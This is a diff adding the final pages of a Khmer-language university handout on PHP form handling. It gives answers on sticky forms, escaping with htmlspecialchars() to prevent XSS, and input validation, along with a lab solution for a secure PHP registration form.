+        <div class="explain-ans-card">
+            <h5>• ចម្លើយ Q4.3 (Sticky Form Importance)៖</h5>
+            <div class="text-block" style="font-size:9.5pt; margin:0;">
+                Sticky Form គឺជាការរក្សាទុកតម្លៃបញ្ចូលចាស់ៗក្នុង Form ពេល Submit ទៅមាន Error។ វាជួយសម្រួលដល់ UX ដោយ User មិនបាច់ចំណាយពេលវាយទិន្នន័យបញ្ចូលឡើងវិញឡើយ។
+            </div>
+        </div>
+
+        <div style="font-family:var(--font-kh-heading); font-size:9pt; color:var(--warning); margin:4px 0 2px 0;">[កម្រិតមធ្យម - Medium Level Solutions]</div>
+        <div class="explain-ans-card">
+            <h5>• ចម្លើយ Q4.4 (XSS Defense with htmlspecialchars)៖</h5>
+            <div class="text-block" style="font-size:9.5pt; margin:0;">
+                XSS Attack កើតឡើងពេល Hacker បញ្ចូល Script អាក្រក់តាម Form។ <code>htmlspecialchars()</code> បំប្លែងតួអក្សរពិសេស (<code>&lt;</code> ទៅ <code>&amp;lt;</code>) ការពារមិនឱ្យ Browser ប្រកាសរត់ Script នោះឡើយ។
+            </div>
+        </div>
+
+        <div class="explain-ans-card">
+            <h5>• ចម្លើយ Q4.5 (Server Validation Setup)៖</h5>
+            <div class="text-block" style="font-size:9.5pt; margin:0;">
+                ប្រើ <code>trim()</code> លុប Space រួចប្រើ <code>empty()</code> Check ទិន្នន័យទទេ, ប្រើ <code>strlen()</code> Check ប្រវែងអក្សរ, និង <code>filter_var($email, FILTER_VALIDATE_EMAIL)</code> Check ទម្រង់ Email។
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ១៩ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 20: PRACTICAL LAB SOLUTIONS & FINAL SIGNATURES -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- LAB 4.9 SOLUTION (FULL SECURE REGISTRATION FORM APPLICATION) -->
+        <div style="font-weight:bold; font-size:9.5pt; color:var(--primary); margin-top:0;">• ដំណោះស្រាយ Lab 4.9 (Full Secure Form Application) <span class="bloom-tag bloom-c6">C6</span>៖</div>
+        
+        <div class="code-window">
+            <div class="code-header"><div class="code-title">secure_register_app.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-kw">declare</span>(strict_types=<span class="cv-num">1</span>);
+<span class="cv-var">$errors</span> = []; <span class="cv-var">$name</span> = <span class="cv-str">''</span>; <span class="cv-var">$email</span> = <span class="cv-str">''</span>;
+
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-var">$name</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'name'</span>] ?? <span class="cv-str">''</span>);
+    <span class="cv-var">$email</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'email'</span>] ?? <span class="cv-str">''</span>);
+
+    <span class="cv-kw">if</span> (<span class="cv-fn">empty</span>(<span class="cv-var">$name</span>)) { <span class="cv-var">$errors</span>[<span class="cv-str">'name'</span>] = <span class="cv-str">"សូមបញ្ចូលឈ្មោះ!"</span>; }
+    <span class="cv-kw">if</span> (!<span class="cv-fn">filter_var</span>(<span class="cv-var">$email</span>, FILTER_VALIDATE_EMAIL)) { <span class="cv-var">$errors</span>[<span class="cv-str">'email'</span>] = <span class="cv-str">"អ៊ីមែលមិនត្រឹមត្រូវ!"</span>; }
+
+    <span class="cv-kw">if</span> (<span class="cv-fn">empty</span>(<span class="cv-var">$errors</span>)) {
+        <span class="cv-fn">header</span>(<span class="cv-str">"Location: secure_register_app.php?success=1"</span>);
+        <span class="cv-kw">exit</span>();
+    }
+}
+<span class="cv-tag">?&gt;</span>
+&lt;form method="POST"&gt;
+    &lt;input type="text" name="name" value="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$name</span>) <span class="cv-tag">?&gt;</span>"&gt;
+    &lt;span style="color:red;"&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-var">$errors</span>[<span class="cv-str">'name'</span>] ?? <span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&lt;/span&gt;&lt;br&gt;
+    
+    &lt;input type="email" name="email" value="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$email</span>) <span class="cv-tag">?&gt;</span>"&gt;
+    &lt;span style="color:red;"&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-var">$errors</span>[<span class="cv-str">'email'</span>] ?? <span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&lt;/span&gt;&lt;br&gt;
+    &lt;button type="submit"&gt;Register&lt;/button&gt;
+&lt;/form&gt;</pre>
+        </div>
+
+        <div style="text-align: center; margin-top: 12px; padding: 15px; background: #F8FAFC; border: 1px solid var(--border-light); border-radius: 10px;">
+            <h3 style="font-family: var(--font-kh-heading); font-size: 11.5pt; color: var(--text-heading); margin-bottom: 3px;">អបអរសាទរ! លោកអ្នកបានបញ្ចប់មេរៀនទី ៤ យ៉ាងបរិបូរណ៍។</h3>
+            <p style="font-size: 8.5pt; color: var(--text-muted); font-family: var(--font-en-main); margin: 0;">*** END OF LESSON 4 HANDOUT (TOTAL 20 PAGES) ***</p>
+        </div>
+
+        <div style="margin-top: 25px; display: flex; justify-content: space-between; align-items: flex-end; width: 100%; padding: 0 10px;">
+            <div style="text-align: center; width: 220px;">
+                <p style="font-size: 9.5pt; font-family: var(--font-kh-body);">បានឃើញ និងពិនិត្យត្រឹមត្រូវ</p>
+                <p style="font-size: 9.5pt; margin-top: 45px; font-family: var(--font-kh-body);">..........................................</p>
+                <p style="font-size: 10pt; font-weight: bold; font-family: var(--font-kh-heading); color: var(--text-heading);">ប្រធានដេប៉ាតឺម៉ង់</p>
+            </div>
+            <div style="text-align: center; width: 260px;">
+                <p style="font-size: 9.5pt; font-family: var(--font-kh-body);">ធ្វើនៅសៀមរាប, ថ្ងៃទី.......ខែ.......ឆ្នាំ ២០២៦</p>
+                <p style="font-size: 10pt; margin-top: 45px; font-weight: bold; font-family: var(--font-kh-heading); color: var(--text-heading);">សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</p>
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ២០ នៃ ២០</div>
+    </div>
+</div>
+
+</body>
+</html>
